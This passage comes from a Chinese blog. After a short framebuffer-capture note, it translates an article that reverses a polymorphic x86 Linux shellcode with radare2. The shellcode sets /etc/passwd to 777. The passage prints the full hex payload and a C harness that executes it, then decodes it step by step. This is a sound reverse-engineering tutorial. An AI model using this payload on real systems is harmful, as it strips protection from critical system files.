<pre><code>cat /dev/fb0 &gt; fb<span class="class">.raw</span>
fbgrab -<span class="tag">i</span> -w <span class="number">1056</span> -h <span class="number">1024</span> -<span class="tag">b</span> <span class="number">32</span> -f framebuffer<span class="class">.raw</span> fb.png
</code></pre><p>获取的也是错位的图像。</p>
<p>后来编译个<code>fbdump</code>挺好用的。</p>
<pre><code><span class="tag">fbdump</span> &gt; <span class="tag">fb</span><span class="class">.ppm</span>
</code></pre><p>然后用gimp啊等转成其它格式就随意了</p>
<pre><code><span class="tag">gimp</span> <span class="tag">fb</span><span class="class">.ppm</span>
</code></pre>
            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2014/08/07/radare2-shellcode/" itemprop="url">
                  Radare2小试: 简单shellcode分析(意译)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-07T00:00:00+08:00" content="2014-08-07">
              2014-08-07
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2014/08/07/radare2-shellcode/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2014/08/07/radare2-shellcode/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>意译自： <a href="http://canthack.org/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/" target="_blank" rel="external">Adventures with Radare2 #1: A Simple Shellcode Analysis</a></p>
<p>有个同学最近在学汇编。把我逆向的热情又拉起来了。下午看到个比较有意思又能看懂的文章，胡乱意译，可以当作我个人的一个笔记。有什么想法可以留言讨论。</p>
<p>以下是正文</p>
<hr>
<p><a href="http://radare.org/" target="_blank" rel="external">Radare2</a>——一个开源逆向工程工具箱，包含反汇编器、调试器和十六进制编辑器。本文将它嗯过逆向在<a href="http://www.projectshellcode.com" target="_blank" rel="external">Project Shellcode</a>上找到的shellcode来展示其基础用法。</p>
<h2 id="Shellcode">Shellcode</h2><p>我们先谈谈啥叫<code>Shellcode</code>，别想成shell脚本了。<code>shellcode</code>之用来挖掘漏洞的有效载荷。其中的典型就是注入一段启动shell的代码。</p>
<p>Project Shellcode是一个shellcode及其源码仓库。我通过<a href="http://reddit.com/r/reverseengineering" target="_blank" rel="external">reddit.com/r/reverseengineering</a>在上月找到的。让我们看看其中一个例子。</p>
<h2 id="60字节的chmod_777多态x86_Linux_Shellcode">60字节的chmod 777多态x86 Linux Shellcode</h2><p>我碰巧先看到<a href="http://www.projectshellcode.com/?q=node/289" target="_blank" rel="external">这个</a>.</p>
<pre><code>/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' <span class="command">\ </span>           __  /'__`<span class="command">\ </span>       /<span class="command">\ </span><span class="command">\_</span>_  /'__`<span class="command">\ </span>                  0
0  /<span class="command">\_</span>, <span class="command">\ </span>   ___   /<span class="command">\_</span><span class="command">\/</span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span>   ___<span class="command">\ </span><span class="command">\ </span>,_<span class="command">\/</span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span> _ ___           1
1  <span class="command">\/</span>_/<span class="command">\ </span><span class="command">\ </span>/' _ `<span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\/</span>_/_<span class="command">\_</span>&lt;_  /'___<span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\`</span>'__<span class="command">\ </span>         0
0     <span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\_</span>_/<span class="command">\ </span><span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span>           1
1      <span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\_</span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\_</span>___/<span class="command">\ </span><span class="command">\_</span>___<span class="command">\\</span> <span class="command">\_</span>_<span class="command">\\</span> <span class="command">\_</span>___/<span class="command">\ </span><span class="command">\_</span><span class="command">\ </span>          0
0       <span class="command">\/</span>_/<span class="command">\/</span>_/<span class="command">\/</span>_/<span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\/</span>___/  <span class="command">\/</span>____/ <span class="command">\/</span>__/ <span class="command">\/</span>___/  <span class="command">\/</span>_/           1
1                  <span class="command">\ </span><span class="command">\_</span>___/ &gt;&gt; Exploit database separated by exploit   0
0                   <span class="command">\/</span>___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  <span class="special">[</span>+<span class="special">]</span> Site            : Inj3ct0r.com                                  0
1  <span class="special">[</span>+<span class="special">]</span> Support e-mail  : submit<span class="special">[</span>at<span class="special">]</span>inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 60 bytes chmod 777 polymorphic x86 linux shellcode
Date   : Sat Jun  5 16:10:00 2010
Author : gunslinger_ 
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com),
ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
mywisdom (devilzc0de.org), loneferret (offensive-security.com)
*/

/*
root@localhost<span class="special">#</span> ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost<span class="special">#</span> gcc -o polymorphic_chmod polymorphic_chmod.c
chmod.c: In function ‘main’:
chmod.c:37: warning: incompatible implicit declaration of built-in function ‘strlen’
root@localhost<span class="special">#</span> ./polymorphic_chmod
Length: 64
root@localhost<span class="special">#</span> ls -la /etc/passwd
-rwxrwxrwx 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost<span class="special">#</span> chmod 644 /etc/passwd
root@localhost<span class="special">#</span> ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
*/

<span class="special">#</span>include &lt;stdio.h&gt;
<span class="special">#</span>include &lt;string.h&gt;

char shellcode<span class="special">[</span><span class="special">]</span> =
    "<span class="command">\xeb</span><span class="command">\x</span>11<span class="command">\x</span>5e<span class="command">\x</span>31<span class="command">\xc</span>9<span class="command">\xb</span>1<span class="command">\x</span>27<span class="command">\x</span>80<span class="command">\x</span>6c<span class="command">\x</span>0e<span class="command">\xff</span><span class="command">\x</span>35<span class="command">\x</span>80<span class="command">\xe</span>9<span class="command">\x</span>01"
    "<span class="command">\x</span>75<span class="command">\xf</span>6<span class="command">\xeb</span><span class="command">\x</span>05<span class="command">\xe</span>8<span class="command">\xea</span><span class="command">\xff</span><span class="command">\xff</span><span class="command">\xff</span><span class="command">\x</span>20<span class="command">\x</span>4a<span class="command">\x</span>66<span class="command">\xf</span>5<span class="command">\xe</span>5<span class="command">\x</span>44"
    "<span class="command">\x</span>90<span class="command">\x</span>66<span class="command">\xfe</span><span class="command">\x</span>9b<span class="command">\xee</span><span class="command">\x</span>34<span class="command">\x</span>36<span class="command">\x</span>02<span class="command">\xb</span>5<span class="command">\x</span>66<span class="command">\xf</span>5<span class="command">\xe</span>5<span class="command">\x</span>36<span class="command">\x</span>66<span class="command">\x</span>10"
    "<span class="command">\x</span>02<span class="command">\xb</span>5<span class="command">\x</span>1d<span class="command">\x</span>1b<span class="command">\x</span>34<span class="command">\x</span>34<span class="command">\x</span>34<span class="command">\x</span>64<span class="command">\x</span>9a<span class="command">\xa</span>9<span class="command">\x</span>98<span class="command">\x</span>64<span class="command">\xa</span>5<span class="command">\x</span>96<span class="command">\xa</span>8"
    "<span class="command">\xa</span>8<span class="command">\xac</span><span class="command">\x</span>99";

int main(void)
<span class="special">{</span>
    fprintf(stdout,"Length: <span class="comment">%zu\n",strlen(shellcode));</span>
    (*(void(*)()) shellcode)();

return 0;
<span class="special">}</span>
</code></pre><p>评论中的描述声称代码在<code>/etc/passwd</code>中设置文件权限为<code>777</code>，但是你乍一看肯定看不出来。我们只能看到一个初始化为16进制的字节数组。接着被投射给函数指针然后调用。</p>
<h2 id="实用Radare2分析">实用Radare2分析</h2><p>我们如何弄清程序做了什么？我们可以构建并且运行它，但我不会。因为它可能移除我的家目录。我们实用radare2静态检测它。</p>
<p>首先构建二进制文件</p>
<pre><code>~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse ⮀ cc -o shellcode polymorphic_chmod_etc_passwd_777.c</span>
</code></pre><p>接着载入到radare2中：</p>
<pre><code> ~/Work/project/<span class="property">reverse</span> ⮀ r2 ./shellcode 
 <span class="comment">-- In soviet Afghanistan you debug radare2!</span>
[<span class="number">0x00400520</span>]&gt; 
</code></pre><p>我们没有加<code>-d</code>参数，这样可以以静态分析模式运行，而不是实用radare2内建的调试器。现在radare已经就绪，让我们开始输入命令。</p>
<p>radare2的命令通常都非常短。键入<code>?</code>回车就会进入帮助概述。若问号后面跟着命令，就会给出命令使用的详细信息。</p>
<p>我们首先得定位字节字符串。因为二进制文件没有被精简(stripped)，有幸保留了<code>main</code>函数的虚拟地址。Radare2使用<code>flags</code>的概念标记二进制文件中的有用位置。尝试键入<code>f</code>来得到标记列表。main函数将被标记为<code>sym.main</code>。</p>
<p>我们使用<code>pd</code>命令反汇编：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; pd@sym.main 
            <span class="comment">;-- sym.main:</span>
            <span class="number">0x0804849c</span>    <span class="number">55</span>           <span class="keyword">push</span> <span class="literal">ebp</span>                                     
            <span class="number">0x0804849d</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
            <span class="number">0x0804849f</span>    83e4f0       <span class="keyword">and</span> <span class="literal">esp</span>, <span class="number">0xfffffff0</span>
            <span class="number">0x080484a2</span>    83ec10       <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="number">0x10</span>
            <span class="number">0x080484a5</span>    c7042440a00. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], sym.shellcode <span class="comment">;  0x0804a040 </span>
            <span class="number">0x080484ac</span>    e8bffeffff   <span class="keyword">call</span> sym.imp.strlen
               <span class="number">0x08048370</span>(unk) <span class="comment">; sym.imp.strlen</span>
            <span class="number">0x080484b1</span>    8b1580a00408 <span class="keyword">mov</span> <span class="literal">edx</span>, [sym.__TMC_END__]
            <span class="number">0x080484b7</span>    <span class="number">89442408</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x8</span>], <span class="literal">eax</span>
</code></pre><p><code>pd</code>命令将反汇编等于<code>block size</code>的代码块(参见<code>b</code>命令)，本例中块大小似乎比main函数大很多。我们知道gcc生成结构非常好的函数，我们让radare2来分析这个函数并完整打印：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; af@sym.main 
[<span class="number">0x080483a0</span>]&gt; pdf@sym.main
           <span class="comment">; DATA XREF from 0x080483b7 (fcn.08048396)</span>
/ (fcn) sym.main <span class="number">61</span>
|          <span class="number">0x0804849c</span>    <span class="number">55</span>           <span class="keyword">push</span> <span class="literal">ebp</span>
|          <span class="number">0x0804849d</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
|          <span class="number">0x0804849f</span>    83e4f0       <span class="keyword">and</span> <span class="literal">esp</span>, <span class="number">0xfffffff0</span>
|          <span class="number">0x080484a2</span>    83ec10       <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="number">0x10</span>
|          <span class="number">0x080484a5</span>    c7042440a00. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], sym.shellcode <span class="comment">;  0x0804a040 </span>
|          <span class="number">0x080484ac</span>    e8bffeffff   <span class="keyword">call</span> sym.imp.strlen
|             sym.imp.strlen(unk)
|          <span class="number">0x080484b1</span>    8b1580a00408 <span class="keyword">mov</span> <span class="literal">edx</span>, [sym.__TMC_END__]
|          <span class="number">0x080484b7</span>    <span class="number">89442408</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x8</span>], <span class="literal">eax</span>
|          <span class="number">0x080484bb</span>    c7442404708. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>+<span class="number">0x4</span>], <span class="keyword">str</span>.Length___zu_n <span class="comment">;  0x08048570 </span>
|          <span class="number">0x080484c3</span>    <span class="number">891424</span>       <span class="keyword">mov</span> [<span class="literal">esp</span>], <span class="literal">edx</span>
|          <span class="number">0x080484c6</span>    e8c5feffff   <span class="keyword">call</span> sym.imp.fprintf
|             sym.imp.fprintf()
|          <span class="number">0x080484cb</span>    b840a00408   <span class="keyword">mov</span> <span class="literal">eax</span>, sym.shellcode <span class="comment">;  0x0804a040 </span>
|          <span class="number">0x080484d0</span>    ffd0         <span class="keyword">call</span> <span class="literal">eax</span>
|             <span class="number">0x00000000</span>() <span class="comment">; section..comment</span>
|          <span class="number">0x080484d2</span>    b800000000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x0</span>
|          <span class="number">0x080484d7</span>    c9           <span class="keyword">leave</span>
\          <span class="number">0x080484d8</span>    c3           <span class="keyword">ret</span>
</code></pre><p>打眼一看就知道需要什么知道什么了。在二进制文件中有足够的信息来帮助标记挖掘漏洞的shellcode字符串位置。你可以在符号名后头看到实际地址。</p>
<p>这个程序对载荷做了什么？可以看到<code>strlen()</code>和<code>fprintf()</code><br>的调用。但更重要的，shellcode的地址在被调用前载入eax寄存器(在<code>0x080484cb</code>载入，于<code>0x080484d0</code>调用)。显然下一步就是检查有效载荷看看它做了什么：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; pD <span class="number">60</span>@sym.shellcode
|      ,  <span class="comment">; DATA XREF from 0x080484a2 (sym.main)</span>
|      ,  <span class="comment">; DATA XREF from 0x080484c8 (sym.main)</span>
       ,  <span class="comment">;-- sym.shellcode:</span>
       ,=&lt; <span class="number">0x0804a040</span>    eb11         <span class="keyword">jmp</span> <span class="number">0x804a053</span>
       |   <span class="comment">;-- str._1___:</span>
       |   <span class="number">0x0804a042</span>     <span class="string">.string</span> <span class="string">"^1ɱ'"</span> <span class="comment">; len=6</span>
      ||   <span class="number">0x0804a048</span>    6c           <span class="keyword">insb</span>
      ||   <span class="number">0x0804a049</span>    0e           <span class="keyword">push</span> <span class="literal">cs</span>
      ||   <span class="number">0x0804a04a</span>    ff3580e90175 <span class="keyword">push</span> <span class="preprocessor">dword</span> [<span class="number">0x7501e980</span>]
       |   <span class="number">0x0804a050</span>    f6eb         <span class="keyword">imul</span> <span class="literal">bl</span>
     | |   <span class="number">0x0804a052</span>    05e8eaffff   <span class="keyword">add</span> <span class="literal">eax</span>, <span class="number">0xffffeae8</span>
     |     <span class="number">0x0804a057</span>    ff20         <span class="keyword">jmp</span> <span class="preprocessor">dword</span> [<span class="literal">eax</span>]
           <span class="number">0x0804a059</span>    4a           <span class="keyword">dec</span> <span class="literal">edx</span>
           <span class="number">0x0804a05a</span>    66f5         o16 <span class="keyword">cmc</span>
           <span class="number">0x0804a05c</span>    e544         <span class="keyword">in</span> <span class="literal">eax</span>, <span class="number">0x44</span>
           <span class="number">0x0804a05e</span>    <span class="number">90</span>           <span class="keyword">nop</span>
           <span class="number">0x0804a05f</span>    66fe9b       invalid
           <span class="number">0x0804a062</span>    ee           <span class="keyword">out</span> <span class="literal">dx</span>, <span class="literal">al</span>
           <span class="number">0x0804a063</span>    <span class="number">3436</span>         <span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x36</span>
           <span class="number">0x0804a065</span>    02b566f5e536 <span class="keyword">add</span> <span class="number">dh</span>, [<span class="literal">ebp</span>+<span class="number">0x36e5f566</span>]
           <span class="number">0x0804a06b</span>    <span class="number">661002</span>       o16 <span class="keyword">adc</span> [<span class="literal">edx</span>], <span class="literal">al</span>
           <span class="number">0x0804a06e</span>    b51d         <span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0x1d</span> <span class="comment">;  0x0000001d </span>
           <span class="comment">;-- str._e444d:</span>
           <span class="number">0x0804a070</span>     <span class="string">.string</span> <span class="string">"\\e444d"</span> <span class="comment">; len=6</span>
           <span class="number">0x0804a076</span>    a99864a596   <span class="keyword">test</span> <span class="literal">eax</span>, <span class="number">0x96a56498</span>
           <span class="number">0x0804a07b</span>    a8           invalid
</code></pre><p>这里使用<code>pD</code>来指定想要反汇编的字节数(这里是60)。该怎么评论这些呢？乍一看，有些不能执行的东西，有点棘手。</p>
<p>译者：我的radare git-2014-7-26版本显然和2011年作者写这篇文章时变化了很多。为了能够继续下去，使用<code>pDi</code>命令：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; pDi <span class="number">60</span>@sym.shellcode
<span class="number">0x0804a040</span>              eb11  <span class="keyword">jmp</span> <span class="number">0x804a053</span>
<span class="number">0x0804a042</span>                5e  <span class="keyword">pop</span> <span class="literal">esi</span>
<span class="number">0x0804a043</span>              31c9  <span class="keyword">xor</span> <span class="literal">ecx</span>, <span class="literal">ecx</span>
<span class="number">0x0804a045</span>              b127  <span class="keyword">mov</span> <span class="literal">cl</span>, <span class="number">0x27</span>
<span class="number">0x0804a047</span>        806c0eff35  <span class="keyword">sub</span> <span class="preprocessor">byte</span> [<span class="literal">esi</span>+<span class="literal">ecx</span>-<span class="number">0x1</span>], <span class="number">0x35</span>
<span class="number">0x0804a04c</span>            80e901  <span class="keyword">sub</span> <span class="literal">cl</span>, <span class="number">0x1</span>
<span class="number">0x0804a04f</span>              75f6  <span class="keyword">jne</span> <span class="number">0x804a047</span>
<span class="number">0x0804a051</span>              eb05  <span class="keyword">jmp</span> <span class="number">0x804a058</span>
<span class="number">0x0804a053</span>        e8eaffffff  <span class="keyword">call</span> <span class="number">0x804a042</span>
<span class="number">0x0804a058</span>            204a66  <span class="keyword">and</span> [<span class="literal">edx</span>+<span class="number">0x66</span>], <span class="literal">cl</span>
<span class="number">0x0804a05b</span>                f5  <span class="keyword">cmc</span>
<span class="number">0x0804a05c</span>              e544  <span class="keyword">in</span> <span class="literal">eax</span>, <span class="number">0x44</span>
<span class="number">0x0804a05e</span>                <span class="number">90</span>  <span class="keyword">nop</span>
<span class="number">0x0804a05f</span>                <span class="number">66</span>  invalid
<span class="number">0x0804a062</span>                ee  <span class="keyword">out</span> <span class="literal">dx</span>, <span class="literal">al</span>
<span class="number">0x0804a063</span>              <span class="number">3436</span>  <span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x36</span>
<span class="number">0x0804a065</span>      02b566f5e536  <span class="keyword">add</span> <span class="number">dh</span>, [<span class="literal">ebp</span>+<span class="number">0x36e5f566</span>]
<span class="number">0x0804a06b</span>            <span class="number">661002</span>  o16 <span class="keyword">adc</span> [<span class="literal">edx</span>], <span class="literal">al</span>
<span class="number">0x0804a06e</span>              b51d  <span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0x1d</span>
<span class="number">0x0804a070</span>            1b3434  <span class="keyword">sbb</span> <span class="literal">esi</span>, [<span class="literal">esp</span>+<span class="literal">esi</span>]
<span class="number">0x0804a073</span>              <span class="number">3464</span>  <span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x64</span>
<span class="number">0x0804a075</span>    9aa99864a596a8  <span class="keyword">call</span> <span class="preprocessor">dword</span> <span class="number">0xa896</span>:<span class="number">0xa56498a9</span>
<span class="number">0x0804a07c</span>              a8ac  <span class="keyword">test</span> <span class="literal">al</span>, <span class="number">0xac</span>
<span class="number">0x0804a07e</span>                <span class="number">99</span>  <span class="keyword">cdq</span>
<span class="number">0x0804a07f</span>            <span class="number">004743</span>  <span class="keyword">add</span> [<span class="literal">edi</span>+<span class="number">0x43</span>], <span class="literal">al</span>
<span class="number">0x0804a082</span>                <span class="number">43</span>  <span class="keyword">inc</span> <span class="literal">ebx</span>
<span class="number">0x0804a083</span>              3a20  <span class="keyword">cmp</span> <span class="number">ah</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a085</span>            <span class="number">284765</span>  <span class="keyword">sub</span> [<span class="literal">edi</span>+<span class="number">0x65</span>], <span class="literal">al</span>
<span class="number">0x0804a088</span>                6e  <span class="keyword">outsb</span>
<span class="number">0x0804a089</span>              746f  <span class="keyword">je</span> <span class="number">0x804a0fa</span>
<span class="number">0x0804a08b</span>                6f  <span class="keyword">outsd</span>
<span class="number">0x0804a08c</span>            20342e  <span class="keyword">and</span> [<span class="literal">esi</span>+<span class="literal">ebp</span>], <span class="number">dh</span>
<span class="number">0x0804a08f</span>                <span class="number">37</span>  <span class="keyword">aaa</span>
<span class="number">0x0804a090</span>    2e332d72312070  <span class="keyword">xor</span> <span class="literal">ebp</span>, [<span class="literal">cs</span>:<span class="number">0x70203172</span>]
<span class="number">0x0804a097</span>              312e  <span class="keyword">xor</span> [<span class="literal">esi</span>], <span class="literal">ebp</span>
<span class="number">0x0804a099</span>            332c20  <span class="keyword">xor</span> <span class="literal">ebp</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a09c</span>              <span class="number">7069</span>  <span class="keyword">jo</span> <span class="number">0x804a107</span>
<span class="number">0x0804a09e</span>      652d302e352e  <span class="keyword">sub</span> <span class="literal">eax</span>, <span class="number">0x2e352e30</span>
<span class="number">0x0804a0a4</span>        352920342e  <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="number">0x2e342029</span>
<span class="number">0x0804a0a9</span>                <span class="number">37</span>  <span class="keyword">aaa</span>
<span class="number">0x0804a0aa</span>            2e3300  <span class="keyword">xor</span> <span class="literal">eax</span>, [<span class="literal">cs</span>:<span class="literal">eax</span>]
<span class="number">0x0804a0ad</span>              1c00  <span class="keyword">sbb</span> <span class="literal">al</span>, <span class="number">0x0</span>
<span class="number">0x0804a0af</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0b1</span>              <span class="number">0200</span>  <span class="keyword">add</span> <span class="literal">al</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a0b3</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0b5</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0b7</span>              <span class="number">0400</span>  <span class="keyword">add</span> <span class="literal">al</span>, <span class="number">0x0</span>
<span class="number">0x0804a0b9</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0bb</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0bd</span>                9c  <span class="keyword">pushfd</span>
<span class="number">0x0804a0be</span>            <span class="number">840408</span>  <span class="keyword">test</span> [<span class="literal">eax</span>+<span class="literal">ecx</span>], <span class="literal">al</span>
<span class="number">0x0804a0c1</span>              3a00  <span class="keyword">cmp</span> <span class="literal">al</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a0c3</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0c5</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0c7</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0c9</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0cb</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0cd</span>                1e  <span class="keyword">push</span> <span class="literal">ds</span>
<span class="number">0x0804a0ce</span>              <span class="number">0300</span>  <span class="keyword">add</span> <span class="literal">eax</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a0d0</span>              <span class="number">0002</span>  <span class="keyword">add</span> [<span class="literal">edx</span>], <span class="literal">al</span>
</code></pre><p>现在开始在心中模拟执行。首先跳到<code>0x804a053</code>，在那里调用<code>0x804a042</code>，就是第一个指令后面的一个指令。</p>
<p>看上去啥也没干似的。但是，<code>call</code>调用将调用的返回地址推入栈中，接着存入<code>esi</code>中。在32位x86中没法直接获取<code>eip</code>，刚才那个过程就是著名的获取eip的一种hack。程序计数器(<code>eip</code>)可以用来指向有效载荷相关的数据/代码(记住：攻击者不知道他的代码将被连接器分配到何处)。</p>
<p>现在执行到<code>0x0804a043</code>，<code>esi</code>中的值是<code>0x0804a058</code>。这个异或指令在把<code>0x27</code>载入<code>ecx</code>前将其置零。</p>
<p><code>0x0804a047</code>开始将<code>[esi+ecx-0x1]</code>地址的内容减<code>0x35</code><br><code>0x3c00104c</code>将<code>ecx</code>减1<br><code>0x3c00104f</code>如果<code>ecx</code>不为零循环到<code>0x0804a047</code></p>
<p><code>ecx</code>是<code>{0x27, 0x26,...,0x1}</code>，<code>esi</code>已知。所以通过计算，需要将从<code>0x0804a058</code>开始的<code>0x27</code>字节减去<code>0x35</code>。为了模拟这个自修改代码的效果。可以使用<code>wo</code>系列命令。查看相关帮助：</p>
<pre><code>[0x080483a0]&gt; wo?
|<span class="string">Usage: wo[asmdxoArl24] [hexpairs] @ addr[:bsize]
</span>|<span class="string">Example:
</span>|<span class="string">  wox 0x90   ; xor cur block with 0x90
</span>|<span class="string">  wox 90     ; xor cur block with 0x90
</span>|<span class="string">  wox 0x0203 ; xor cur block with 0203
</span>|<span class="string">  woa 02 03  ; add [0203][0203][...] to curblk
</span>|<span class="string">  woe 02 03  
</span>|<span class="string">Supported operations:
</span>|<span class="string">  wow  ==  write looped value (alias for 'wb')
</span>|<span class="string">  woa  +=  addition
</span>|<span class="string">  wos  -=  substraction
</span>|<span class="string">  wom  *=  multiply
</span>|<span class="string">  wod  /=  divide
</span>|<span class="string">  wox  ^=  xor
</span>|<span class="string">  woo  </span>|<span class="string">=  or
</span>|<span class="string">  woA  &amp;=  and
</span>|<span class="string">  woR  random bytes (alias for 'wr $b'
</span>|<span class="string">  wor  &gt;&gt;= shift right
</span>|<span class="string">  wol  &lt;&lt;= shift left
</span>|<span class="string">  wo2  2=  2 byte endian swap
</span>|<span class="string">  wo4  4=  4 byte endian swap</span>
</code></pre><p>使用<code>wos</code>从一段内存地址中减去一个常量。但首先要打开输入输出缓存(io cache)。默认情况下radare2以只读方式打开文件，除非以<code>-w</code>标志打开。或者，设置<code>io.cache</code>为<code>true</code>，在内润中缓存写入内容。用户可随意撤销或者提交这些写入，暂不用讨论这些细节。</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; e io.cache=true
[<span class="number">0x080483a0</span>]&gt; wos <span class="number">0x35</span>@<span class="number">0x0804a058</span>:<span class="number">0x27</span>
[<span class="number">0x080483a0</span>]&gt; pDi <span class="number">30</span>@sym.shellcode 
<span class="number">0x0804a040</span>              eb11  <span class="keyword">jmp</span> <span class="number">0x804a053</span>
<span class="number">0x0804a042</span>                5e  <span class="keyword">pop</span> <span class="literal">esi</span>
<span class="number">0x0804a043</span>              31c9  <span class="keyword">xor</span> <span class="literal">ecx</span>, <span class="literal">ecx</span>
<span class="number">0x0804a045</span>              b127  <span class="keyword">mov</span> <span class="literal">cl</span>, <span class="number">0x27</span>
<span class="number">0x0804a047</span>        806c0eff35  <span class="keyword">sub</span> <span class="preprocessor">byte</span> [<span class="literal">esi</span>+<span class="literal">ecx</span>-<span class="number">0x1</span>], <span class="number">0x35</span>
<span class="number">0x0804a04c</span>            80e901  <span class="keyword">sub</span> <span class="literal">cl</span>, <span class="number">0x1</span>
<span class="number">0x0804a04f</span>              75f6  <span class="keyword">jne</span> <span class="number">0x804a047</span>
<span class="number">0x0804a051</span>              eb05  <span class="keyword">jmp</span> <span class="number">0x804a058</span>
<span class="number">0x0804a053</span>        e8eaffffff  <span class="keyword">call</span> <span class="number">0x804a042</span>
<span class="number">0x0804a058</span>              eb15  <span class="keyword">jmp</span> <span class="number">0x804a06f</span>
<span class="number">0x0804a05a</span>              31c0  <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="number">0x0804a05c</span>              b00f  <span class="keyword">mov</span> <span class="literal">al</span>, <span class="number">0xf</span>
<span class="number">0x0804a05e</span>                5b  <span class="keyword">pop</span> <span class="literal">ebx</span>
